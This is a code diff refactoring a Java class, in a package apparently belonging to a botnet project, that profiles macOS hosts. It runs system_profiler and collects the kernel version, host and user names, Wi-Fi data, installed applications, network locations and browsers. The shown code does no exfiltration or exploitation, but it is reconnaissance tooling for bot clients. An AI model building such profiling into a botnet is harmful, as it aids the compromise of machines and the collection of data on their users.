@@ -26,11 +26,11 @@
 
 package com.acmutv.botnet.tool.runtime;
 
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.StringReader;
 import java.util.Random;
-
 import lombok.Data;
-import lombok.NoArgsConstructor;
-
 /**
  * This class provides methods for the detection of sys info from Mac OS X operating system 
  * @author Giacomo Marciani {@literal <gmarciani@ieee.org>}
@@ -38,78 +38,120 @@ import lombok.NoArgsConstructor;
  * @since 1.0.0
  * @see Random
  */
-
 @Data
-@NoArgsConstructor
-public class AppleSysInfoTools {
-
+public class MacOsxSysInfoTools 
+{
 	/* Apple command: system_profiler -listDataTypes */
-	
+
 	/**
 	 * Returns the kernel version of the system
 	 * @return kernel Version
 	 */
 	public String getKernelVersion(){
-		return RuntimeManager.runCmd("system_profiler SPSoftwareDataType | grep -e  Kernel' 'Version | awk -F':' '{print $2}'");
+
+		String SPSDT = RunCmdTools.runCmd("system_profiler SPSoftwareDataType");
+		String kernelVersion = "";
+		BufferedReader reader = new BufferedReader(new StringReader(SPSDT));
+		String lines;
+		try {
+			while ((lines = reader.readLine()) != null)  {
+				if (lines.length() > 0){
+					if(lines.contains("Kernel Version:"))
+						kernelVersion = lines.substring(lines.indexOf("Kernel Version: ")).replace("Kernel Version:", "");;
+				}
+			}
+		} catch (IOException e) {
+			e.printStackTrace();
+		}
+
+		return kernelVersion;		
 	}
-	
 	/**
 	 * Returns the name of the host
 	 * @return hostname
 	 */
 	public String getHostName(){
-		return RuntimeManager.runCmd("system_profiler SPSoftwareDataType | grep -e  Computer' 'Name | awk -F':' '{print $2}'");
+		String SPSDT = RunCmdTools.runCmd("system_profiler SPSoftwareDataType");
+		String hostName = "";
+		BufferedReader reader = new BufferedReader(new StringReader(SPSDT));
+		String lines;
+		try {
+			while ((lines = reader.readLine()) != null)  {
+				if (lines.length() > 0){
+					if(lines.contains("Computer Name:"))
+						hostName = lines.substring(lines.indexOf("Computer Name: ")).replace("Computer Name:", "");
+				}
+			}
+		} catch (IOException e) {
+			e.printStackTrace();
+		}
+		return hostName;
 	}
-	
+
 	/**
 	 * Returns the username of the active user on the system
 	 * @return username
+	 * @throws IOException 
 	 */
 	public String getUserName(){
-		return RuntimeManager.runCmd("system_profiler SPSoftwareDataType | grep -e  User' 'Name | awk -F':' '{print $2}'");
+		String SPSDT = RunCmdTools.runCmd("system_profiler SPSoftwareDataType");
+		String userName = "";
+		BufferedReader reader = new BufferedReader(new StringReader(SPSDT));
+		String lines;
+		try {
+			while ((lines = reader.readLine()) != null)  {
+				if (lines.length() > 0){
+					if(lines.contains("User Name:"))
+						userName = lines.substring(lines.indexOf("User Name: ")).replace("User Name:", "");
+				}
+			}
+		} catch (IOException e) {
+			e.printStackTrace();
+		}
+		return userName;
 	}
-	
+
 	/**
 	 * Returns info of the network it is connected to the system
 	 * @return network info
 	 */
 	public String getNetworkData(){
-		return RuntimeManager.runCmd("system_profiler SPAirPortDataType");
+		return RunCmdTools.runCmd("system_profiler SPAirPortDataType");
 	}
-	
+
 	/**
 	 * Returns the list of applications installed on the system
 	 * @return applications list
 	 */
 	public String getApplications(){
-		return RuntimeManager.runCmd("system_profiler SPApplicationsDataType");
+		return RunCmdTools.runCmd("system_profiler SPApplicationsDataType");
 	}
-	
+
 	/**
 	 * Returns the local connections of the system
 	 * @return local connections list
 	 */
 	public String getNetworkLocations(){
-		return RuntimeManager.runCmd("system_profiler SPNetworkLocationDataType");
+		return RunCmdTools.runCmd("system_profiler SPNetworkLocationDataType");
 	}
-	
+
 	/**
 	 * Returns the list of browsers installed on the system
 	 * @return browsers list
 	 */
 	public String getBrowsers(){
-		String app = RuntimeManager.runCmd("system_profiler SPApplicationsDataType");
+		String app = RunCmdTools.runCmd("system_profiler SPApplicationsDataType");
 		String browsers = "";
-		
+
 		if(app.contains("Chrome.app"))
-			browsers +="\nGoogle Chrome";
+			browsers +=" Google Chrome ";
 		if(app.contains("Safari.app"))
-			browsers +="\nSafari";
+			browsers +=" Safari ";
 		if(app.contains("Mozilla.app"))
-			browsers +="\nMozilla";
+			browsers +=" Mozilla-Firefox ";
 		if(app.contains("Opera.app"))
-			browsers +="\nOpera";
-		
+			browsers +=" Opera ";
+
 		return browsers;
 	}	
 }
